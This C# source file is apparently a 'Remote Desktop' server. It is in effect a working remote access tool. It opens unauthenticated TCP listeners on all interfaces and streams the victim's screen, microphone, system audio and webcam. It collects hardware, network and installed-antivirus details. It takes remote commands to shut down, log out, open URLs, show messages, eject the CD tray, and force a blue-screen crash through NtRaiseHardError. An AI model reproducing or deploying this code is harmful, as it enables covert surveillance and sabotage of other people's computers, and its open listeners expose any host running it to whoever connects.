using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using NAudio.Wave;
using AForge.Video.DirectShow;
using System.Linq;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Management;
using Newtonsoft.Json;
using Hardware.Info;

namespace Server
{
    class Program
    {

        [DllImport("winmm.dll")]
        private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);


        static TcpListener screenListener;
        static TcpListener voiceListener;
        static TcpListener cameraListener;
        static TcpListener speakerListener;
        static TcpListener comsListener;


        static FilterInfoCollection videoDevices;
        static int currentDeviceIndex = 1;
        static VideoCaptureDevice videoSource;

        static bool isScreenSharingPaused = false;
        static bool isMicAudio = false;
        static bool isSystemAudio = false;
        static bool isCDTrayOpen = false;

        static public int fps = 60;
        static public int compression = 100;

        static string info = "Remote Desktop: " + Environment.UserName + "@" + Environment.MachineName + ". Monitor Count: " + SystemInformation.MonitorCount;
        static string systemInfo;
        static IHardwareInfo hardwareInfo;

        static async Task Main(string[] args)
        {
            Console.SetWindowSize(110, 25);
            

            screenListener = new TcpListener(IPAddress.Any, 8888);
            screenListener.Start();
            Console.WriteLine("Screen sharing service started.");

            voiceListener = new TcpListener(IPAddress.Any, 8889);
            voiceListener.Start();
            Console.WriteLine("Voice sharing service started.");

            cameraListener = new TcpListener(IPAddress.Any, 8890);
            cameraListener.Start();
            Console.WriteLine("Camera sharing service started.");

            speakerListener = new TcpListener(IPAddress.Any, 8891);
            speakerListener.Start();
            Console.WriteLine("Speaker sharing service started.");

            comsListener = new TcpListener(IPAddress.Any, 8892);
            comsListener.Start();
            Console.WriteLine("Communication service started.");



            Console.WriteLine("Getting system info...");
            _ = Task.Run(async () => systemInfo = await Task.Run(GetSystemInfo));

            await Task.WhenAll(
                IsInfoReady(),
                AcceptClientsAsync(screenListener, HandleScreenClientAsync),
                AcceptClientsAsync(voiceListener, HandleVoiceClientAsync),
                //AcceptClientsAsync(cameraListener, HandleCameraClientAsync),
                AcceptClientsAsync(speakerListener, HandleSpeakerClientAsync),
                AcceptClientsAsync(comsListener, HandleComsClinetAsync)
            );
        }

        private static async Task IsInfoReady()
        {
            while (true)
            {
                if (systemInfo != null)
                {
                    Console.WriteLine("Done getting system info!");
                    await SendData("info" + systemInfo, comsListener.AcceptTcpClient());
                    return;
                }
               await Task.Delay(500);
            }
        }

        private static async Task AcceptClientsAsync(TcpListener listener, Func<TcpClient, Task> handleClient)
        {
            try
            {
                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    Console.WriteLine("Client connected.");

                    _ = handleClient(client);

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accepting clients: {ex.Message}");
            }
        }

        private static async Task HandleCameraClientAsync(TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            var videoSources = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            
            int selectedCameraIndex = 0;  // Start with the first camera

            if (videoSources.Count == 0)
            {
                Console.WriteLine("No video sources found.");
                return;
            }

            try
            {
                videoSource = new VideoCaptureDevice(videoSources[selectedCameraIndex].MonikerString);
                //StartCamera(videoSource, stream);

                byte[] buffer = new byte[1024];
                while (true)
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) continue;  // No data received

                    string command = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    if (command.StartsWith("switch"))
                    {
                        int newCameraIndex;
                        if (int.TryParse(command.Substring(6).Trim(), out newCameraIndex))
                        {
                            newCameraIndex = (newCameraIndex % videoSources.Count + videoSources.Count) % videoSources.Count;  // Wrap-around logic
                            if (newCameraIndex != selectedCameraIndex)
                            {
                                videoSource.SignalToStop();
                                videoSource.WaitForStop();
                                selectedCameraIndex = newCameraIndex;
                                videoSource = new VideoCaptureDevice(videoSources[selectedCameraIndex].MonikerString);
                                StartCamera(videoSource, stream);
                                Console.WriteLine($"Switched to camera {selectedCameraIndex}");
                            }
                            else
                            {
                                Console.WriteLine("Switching to the same camera, adjusting index...");
                                selectedCameraIndex = (selectedCameraIndex + 1) % videoSources.Count;  // Force switch to next camera
                                videoSource.SignalToStop();
                                videoSource.WaitForStop();
                                videoSource = new VideoCaptureDevice(videoSources[selectedCameraIndex].MonikerString);
                                StartCamera(videoSource, stream);
                                Console.WriteLine($"Automatically switched to camera {selectedCameraIndex}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling camera client: {ex.Message}");
            }
            finally
            {
                videoSource?.SignalToStop();
                videoSource?.WaitForStop();
                client.Close();
                stream.Close();
                Console.WriteLine("Camera server has cleaned up the client connection.");
            }
        }

        private static void StartCamera(VideoCaptureDevice videoSource, NetworkStream stream, int desiredWidth = 640, int desiredHeight = 480, int desiredFps = 15)
        {
            // Check for supported resolutions and select one
            var capabilities = videoSource.VideoCapabilities;
            VideoCapabilities selectedCapability = null;

            // Attempt to find the exact match for resolution and frame rate
            foreach (var cap in capabilities)
            {
                if (cap.FrameSize.Width == desiredWidth &&
                    cap.FrameSize.Height == desiredHeight &&
                    cap.MaximumFrameRate >= desiredFps)
                {
                    if (selectedCapability == null || cap.MaximumFrameRate < selectedCapability.MaximumFrameRate)
                    {
                        selectedCapability = cap;
                    }
                }
            }

            if (selectedCapability != null)
            {
                videoSource.VideoResolution = selectedCapability;
                Console.WriteLine($"Selected camera resolution: {selectedCapability.FrameSize.Width}x{selectedCapability.FrameSize.Height} at up to {selectedCapability.MaximumFrameRate} fps");
            }
            else
            {
                Console.WriteLine("Desired resolution and frame rate not supported. Using default settings.");
            }

            videoSource.NewFrame += (sender, eventArgs) =>
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    eventArgs.Frame.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    byte[] imageData = ms.ToArray();
                    SendImageSize(stream, imageData.Length);
                    SendImageData(stream, imageData);
                }
            };
            videoSource.Start();
        }

        private static async Task HandleScreenClientAsync(TcpClient client)
        {
            try
            {
                using (NetworkStream stream = client.GetStream())
                {
                    Task sendingTask = SendScreenSharingFramesAsync(stream);

                    await Task.WhenAll(sendingTask);

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling client: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }

        private static async Task HandleVoiceClientAsync(TcpClient client)
        {
            try
            {
                using (NetworkStream stream = client.GetStream())
                {
                    var waveIn = new WaveInEvent();
                    waveIn.WaveFormat = new WaveFormat(44100, 1);

                    waveIn.DataAvailable += (sender, e) =>
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            ms.Write(BitConverter.GetBytes(e.BytesRecorded), 0, 4);
                            ms.Write(e.Buffer, 0, e.BytesRecorded);
                            stream.Write(ms.ToArray(), 0, (int)ms.Length);
                        }
                    };

                    waveIn.StartRecording();
                    Console.WriteLine("Capturing audio...");

                    await Task.Delay(-1); // Keep the voice client running until manually stopped

                    waveIn.StopRecording();
                    Console.WriteLine("Stopped capturing audio...");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling voice client: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }

        private static async Task HandleSpeakerClientAsync(TcpClient client)
        {
            try
            {
                using (NetworkStream stream = client.GetStream())
                {
                    var waveIn = new WasapiLoopbackCapture();
                    waveIn.WaveFormat = new WaveFormat(44100, 1);

                    waveIn.DataAvailable += (sender, e) =>
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            ms.Write(BitConverter.GetBytes(e.BytesRecorded), 0, 4);
                            ms.Write(e.Buffer, 0, e.BytesRecorded);
                            stream.Write(ms.ToArray(), 0, (int)ms.Length);
                        }
                    };

                    waveIn.StartRecording();
                    Console.WriteLine("Capturing system audio...");

                    await Task.Delay(-1); // Keep the voice client running until manually stopped

                    waveIn.StopRecording();
                    Console.WriteLine("Stopped capturing system audio...");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling speaker client: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }

        private static async Task ReceiveDataFromClientAsync(NetworkStream stream)
        {
            try
            {
                byte[] buffer = new byte[1024];
                while (true)
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead > 0)
                    {
                        string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                        
                        if (receivedData.StartsWith("fps"))
                        {
                            string numberString = receivedData.Substring(3);

                            if (int.TryParse(numberString, out int number))
                            {
                                fps = number;
                            }
                        }

                        if (receivedData.StartsWith("compression"))
                        {
                            string numberString = receivedData.Substring(11);

                            if (int.TryParse(numberString, out int number))
                            {
                                compression = number;
                            }
                        }

                        if (receivedData.StartsWith("msg"))
                        {
                            string msgString = receivedData.Substring(3);

                            string[] parts = msgString.Split('|');
                            if (parts.Length < 2)
                            {
                                Console.WriteLine("Invalid format for messagebox. Use: text|title|buttons|icon");
                                return;
                            }

                            string text = parts[0];
                            string title = parts[1];
                            MessageBoxButtons buttons = MessageBoxButtons.OK;
                            MessageBoxIcon icon = MessageBoxIcon.None;

                            if (parts.Length > 2 && Enum.TryParse(parts[2], out MessageBoxButtons parsedButtons))
                            {
                                buttons = parsedButtons;
                            }
                            if (parts.Length > 3 && Enum.TryParse(parts[3], out MessageBoxIcon parsedIcon))
                            {
                                icon = parsedIcon;
                            }

                            MessageBox.Show(text, title, buttons, icon);
                        }

                        if(receivedData.StartsWith("openweb")) 
                        {
                            string url = receivedData.Substring(7);
                            Process.Start(url);
                        }


                        switch (receivedData)
                        {
                            case "pauseCam":
                                videoSource.Stop();
                                break;
                            case "resumeCam":
                                videoSource.Start();
                                break;

                            case "info":
                                byte[] responseBytesInfo = Encoding.UTF8.GetBytes("info" + systemInfo);
                                await stream.WriteAsync(responseBytesInfo, 0, responseBytesInfo.Length);
                                break;

                            case "pauseScreen":
                                isScreenSharingPaused = true;
                                break;
                                

                            case "resumeScreen":
                                isScreenSharingPaused = false;
                                break;

                            case "micOn":
                                isMicAudio = true;
                                break;

                            case "micOff":
                                isMicAudio = false;
                                break;

                            case "speakerOn":
                                isSystemAudio = true;
                                break;

                            case "speakerOff":
                                isSystemAudio = false;
                                break;

                            case "shutdown":
                                Shutdown();
                                break;

                            case "restart":
                                Restart();
                                break
                                    ;
                            case "sleep":
                                Sleep();
                                break;

                            case "logout":
                                Logout();
                                break;

                            case "togglecd":
                                CDTray();
                                break;

                            case "bsod":
                                BSOD();
                                break;

                            default: break;
                        }

                        Console.WriteLine("Received data from client: " + receivedData);
                    }
                }
            }
            catch (IOException ex) when (ex.InnerException is SocketException)
            {
                Console.WriteLine("Client disconnected.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error receiving data from client: {ex.Message}");
            }
        }

        private static async Task SendData(string data, TcpClient client)
        {
            try
            {
                NetworkStream stream = client.GetStream();
                if (stream.CanWrite && stream != null)
                {
                    byte[] dataBytes = Encoding.UTF8.GetBytes(data);
                    await stream.WriteAsync(dataBytes, 0, dataBytes.Length);
                }
            }
            catch (IOException ex) when (ex.InnerException is SocketException)
            {
                Console.WriteLine("Coms client disconnected.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending data to comms client: {ex.Message}");
            }
        }

        private static async Task SendScreenSharingFramesAsync(NetworkStream stream)
        {

            Bitmap screenshot = null;
            
            MemoryStream ms = null;
            EncoderParameters encoderParams = null;
            ImageCodecInfo jpegCodec = null;

            int batchSize = 1;
            List<byte[]> frameBatch = new List<byte[]>();


            try
            {
                while (true)
                {
                    if (!isScreenSharingPaused)
                    {
                        screenshot = CaptureScreen();

                        byte[] imageData;
                        using (ms = new MemoryStream())
                        {
                            if(compression == 100)
                            {
                                screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                            }
                            else
                            {

                                await Task.Run(() =>
                                {
                                    var qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, compression); // Adjust quality (1-100)
                                    jpegCodec = GetEncoder(ImageFormat.Jpeg);
                                    encoderParams = new EncoderParameters(1);
                                    encoderParams.Param[0] = qualityParam;

                                    screenshot.Save(ms, jpegCodec, encoderParams);
                                });


                            }

                            // Add the frame to the batch
                            frameBatch.Add(ms.ToArray());

                            if (frameBatch.Count >= batchSize)
                            {
                                bool success = await SendFrameBatchAsync(stream, frameBatch);
                                if (!success)
                                {
                                    // If sending fails, break out of the loop
                                    Console.WriteLine("Client disconnected.");
                                    break;
                                }
                                frameBatch.Clear(); // Reset the batch
                            }
                        }
                    }

                    await Task.Delay(1000 / fps);
                }
            }
            catch (IOException ex) when (ex.InnerException is SocketException)
            {
                // Client disconnected
                Console.WriteLine("Client disconnected.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending screen sharing frames: {ex.Message}");
            }
        }

        private static async Task<bool> SendFrameBatchAsync(NetworkStream stream, List<byte[]> frameBatch)
        {
            try
            {

                // Serialize the batch
                using (var batchStream = new MemoryStream())
                {
                    // Write the number of frames in the batch
                    batchStream.Write(BitConverter.GetBytes(frameBatch.Count), 0, sizeof(int));

                    // Write each frame's size and data
                    foreach (var frame in frameBatch)
                    {
                        batchStream.Write(BitConverter.GetBytes(frame.Length), 0, sizeof(int));
                        batchStream.Write(frame, 0, frame.Length);
                    }

                    // Send the batch
                    byte[] batchData = batchStream.ToArray();
                    await stream.WriteAsync(batchData, 0, batchData.Length);
                }

                return true; // Success
            }
            catch (IOException ex) when (ex.InnerException is SocketException)
            {
                Console.WriteLine("Client disconnected while sending frame batch.");
                return false;
            }
            catch (SocketException ex)
            {
                Console.WriteLine($"Socket error while sending frame batch: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending frame batch: {ex.Message}");
                return false;
            }
        }

        private static async Task HandleComsClinetAsync(TcpClient client)
        {
            try
            {
                using (NetworkStream stream = client.GetStream())
                { 
                    Task receivingTask = ReceiveDataFromClientAsync(stream);
                    await Task.WhenAll(receivingTask);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling client: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }

        private static void SendImageSize(NetworkStream stream, int imageSize)
        {
            byte[] sizeBytes = BitConverter.GetBytes(imageSize);
            stream.Write(sizeBytes, 0, sizeBytes.Length);
        }

        private static void SendImageData(NetworkStream stream, byte[] imageData)
        {
            try
            {
                stream.Write(imageData, 0, imageData.Length);
            }
            catch (IOException e) when (e.InnerException is SocketException)
            {
                Console.WriteLine("Client disconnected.");
            }
            catch (Exception e)
            {
                Console.WriteLine("Error sending image data: " + e.Message);
            }

        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
        }


        static void Shutdown()
        {
            ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /f /t 0");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }


        static void Restart()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/r /t 0") { CreateNoWindow = true, UseShellExecute = false });
        }

        static void Sleep()
        {
            Process.Start(new ProcessStartInfo("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0") { CreateNoWindow = true, UseShellExecute = false });
        }

        static void Logout()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/l") { CreateNoWindow = true, UseShellExecute = false });
        }

        static void CDTray()
        {
            if (isCDTrayOpen)
            {
                mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
                Console.WriteLine("Closing CD tray...");
            }
            else
            {
                mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
                Console.WriteLine("Opening CD tray...");
            }
            isCDTrayOpen = !isCDTrayOpen;
        }

        static void BSOD()
        {
            RtlAdjustPrivilege(19, true, false, out bool t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out uint t2);
        }


        static string GetSystemInfo()
        {
            try
            {
                hardwareInfo = new HardwareInfo();
                hardwareInfo.RefreshAll();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }


            var uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
            var (ip, mac, speed, name) = GetNIC();


            var systemInfo = new SystemInfo
            {
                Title = info,
                OS = hardwareInfo.OperatingSystem?.Name + " " + hardwareInfo.OperatingSystem?.VersionString,
                SystemManufacturer = hardwareInfo.ComputerSystemList.FirstOrDefault()?.Vendor ?? "Unknown",
                SystemModel = hardwareInfo.ComputerSystemList.FirstOrDefault()?.Name ?? "Unknown",
                UserName = Environment.UserName,
                MachineName = Environment.MachineName,
                BootTime = GetBootTime(),
                Uptime = $"{uptime.Days}d {uptime.Hours}h {uptime.Minutes}m",
                SerialNumber = hardwareInfo.BiosList.FirstOrDefault()?.SerialNumber ?? "Unknown",
                BiosVersion = hardwareInfo.BiosList.FirstOrDefault()?.Version ?? "Unknown",
                BiosVendor = hardwareInfo.BiosList.FirstOrDefault()?.Manufacturer ?? "Unknown",

                // CPU
                CPU = hardwareInfo.CpuList.FirstOrDefault()?.Name ?? "Unknown",
                CPUCores = (int?)hardwareInfo.CpuList.FirstOrDefault()?.NumberOfCores ?? 0,
                CPUThreads = (int?)hardwareInfo.CpuList.FirstOrDefault()?.NumberOfLogicalProcessors ?? 0,
                CPUClockSpeed = $"{hardwareInfo.CpuList.FirstOrDefault()?.MaxClockSpeed ?? 0} MHz",
                Virtualization = hardwareInfo.CpuList.FirstOrDefault()?.VirtualizationFirmwareEnabled.ToString() ?? "Unknown",
                CPUBoostClock = $"{hardwareInfo.CpuList.FirstOrDefault()?.MaxClockSpeed ?? 0} MHz",

                // RAM
                RAM = GetRAMSize() + " GB",
                RAMSpeed = Convert.ToString(hardwareInfo.MemoryList.FirstOrDefault()?.Speed ?? 0),
                RAMManufacturer = hardwareInfo.MemoryList.FirstOrDefault()?.Manufacturer ?? "Unknown",

                // GPU
                GPU = hardwareInfo.VideoControllerList.FirstOrDefault()?.Name ?? "Unknown",
                GPUMemory = Convert.ToString(hardwareInfo.VideoControllerList.FirstOrDefault()?.AdapterRAM / (1024 * 1024 * 1024) ?? 0) + " GB",
                GPUDriverVersion = hardwareInfo.VideoControllerList.FirstOrDefault()?.DriverVersion ?? "Unknown",
                GPUFps = Convert.ToString(hardwareInfo.VideoControllerList.FirstOrDefault()?.CurrentRefreshRate ?? 0),

                // Storage
                Drives = GetDrives(),

                // Motherboard
                MotherboardModel = hardwareInfo.MotherboardList.FirstOrDefault()?.Product ?? "Unknown",
                MotherboardManufacturer = hardwareInfo.MotherboardList.FirstOrDefault()?.Manufacturer ?? "Unknown",

                // Network
                IPAddress = ip ?? "Unknown",
                PublicIPAddress = GetPublicIPAddress(),
                MACAddress = mac ?? "Unknown",
                NetworkAdapter = name ?? "Unknown",
                NetworkSpeed = speed ?? "Unknown",

                // Battery
                BatteryStatus = hardwareInfo.BatteryList.FirstOrDefault()?.BatteryStatus.ToString() ?? "Unknown",
                BatteryPercentage = Convert.ToString(hardwareInfo.BatteryList.FirstOrDefault()?.EstimatedChargeRemaining ?? 0) + "%",
                BatteryCapacity = Convert.ToString(hardwareInfo.BatteryList.FirstOrDefault()?.DesignCapacity ?? 0) + " mWh",

                // Display & Peripherals
                DisplayResolution = Convert.ToString(hardwareInfo.VideoControllerList.FirstOrDefault()?.CurrentHorizontalResolution) + "x" + Convert.ToString(hardwareInfo.VideoControllerList.FirstOrDefault()?.CurrentVerticalResolution),
                ConnectedDisplays = Convert.ToString(hardwareInfo.MonitorList.Count),

                // Security
                InstalledAntivirus = GetAntivirus(),

                // Virtualization
                IsVirtualizationEnabled = hardwareInfo.CpuList.FirstOrDefault()?.VirtualizationFirmwareEnabled == true ? "Yes" : "No"
            };

            return JsonConvert.SerializeObject(systemInfo, Formatting.Indented);

        }

        private static string GetAntivirus()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        return obj["displayName"]?.ToString() ?? "Unknown";
                    }
                }
            }
            catch
            {
                return "Unknown";
            }

            return "None";
        }


        static string GetDrives()
        {
            StringBuilder drives = new StringBuilder();

            foreach (var drive in DriveInfo.GetDrives().Select(d => d.Name).ToList())
            {
                try
                {
                    var di = new DriveInfo(drive);
                    drives.AppendLine(drive + " - " + di.TotalSize / 1000000000 + " GB");
                }
                catch { }
            }

            return drives.ToString();
        }

        private static string GetRAMSize()
        {
            ulong totalMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
            return (totalMemory / (1024 * 1024 * 1024)).ToString();
        }


        private static string GetBootTime()
        {
            var query = new System.Management.ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem");
            foreach (var item in query.Get())
            {
                var bootTime = System.Management.ManagementDateTimeConverter.ToDateTime(item["LastBootUpTime"].ToString());
                return bootTime.ToString();
            }
            return "Unknown";
        }


        private static string GetPublicIPAddress()
        {
            try
            {
                return new WebClient().DownloadString("https://api.ipify.org").Trim();
            }
            catch
            {
                return "Unknown";
            }
        }


        static (string IpAddress, string MacAddress, string Speed, string Name) GetNIC()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                     ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                {
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            string ipAddress = ip.Address.ToString();
                            string macAddress = ni.GetPhysicalAddress().ToString();

                            // Format as AA:BB:CC:DD:EE:FF
                            macAddress = string.Join(":", Enumerable.Range(0, macAddress.Length / 2)
                                .Select(i => macAddress.Substring(i * 2, 2)));

                            string speed = ni.Speed > 0 ? $"{ni.Speed / 1_000_000} Mbps" : "Unknown";  // Speed in Mbps
                            string Name = ni.Name;

                            return (ipAddress, macAddress, speed, Name);
                        }
                    }
                }
            }

            return ("Unknown", "Unknown", "Unknown", "Unknown");
        }


        static Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);

            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);

                Cursor currentCursor = Cursors.Default;
                if (currentCursor != null)
                {
                    Point cursorPos = Cursor.Position;

                    Rectangle cursorBounds = new Rectangle(cursorPos, currentCursor.Size);
                    currentCursor.Draw(g, cursorBounds);
                }
            }
            return screenshot;
        }
    }


    public class SystemInfo
    {
        // General System Info
        public string Title { get; set; }
        public string OS { get; set; }
        public string SystemManufacturer { get; set; }
        public string SystemModel { get; set; }
        public string UserName { get; set; }
        public string MachineName { get; set; }
        public string BootTime { get; set; }
        public string Uptime { get; set; }
        public string SerialNumber { get; set; }
        public string BiosVersion { get; set; }
        public string BiosVendor { get; set; }

        // CPU Info
        public string CPU { get; set; }
        public int CPUCores { get; set; }
        public int CPUThreads { get; set; }
        public string CPUClockSpeed { get; set; }
        public string CPUBoostClock { get; set; }
        public string Virtualization { get; set; }

        // RAM Info
        public string RAM { get; set; }
        public string RAMSpeed { get; set; }
        public string RAMManufacturer { get; set; }

        // GPU Info
        public string GPU { get; set; }
        public string GPUMemory { get; set; }
        public string GPUDriverVersion { get; set; }
        public string GPUFps { get; set; }

        // Storage Info
        public string Drives { get; set; }


        // Motherboard Info
        public string MotherboardModel { get; set; }
        public string MotherboardManufacturer { get; set; }


        // Network Info
        public string IPAddress { get; set; }
        public string PublicIPAddress { get; set; }
        public string MACAddress { get; set; }
        public string NetworkAdapter { get; set; }
        public string NetworkSpeed { get; set; }


        // Battery Info
        public string BatteryStatus { get; set; }
        public string BatteryPercentage { get; set; }
        public string BatteryCapacity { get; set; }

        // Peripheral Info

        public string DisplayResolution { get; set; }
        public string ConnectedDisplays { get; set; }

        // Security Info
        public string InstalledAntivirus { get; set; }

        // Virtualization Info
        public string IsVirtualizationEnabled { get; set; }
    }

}
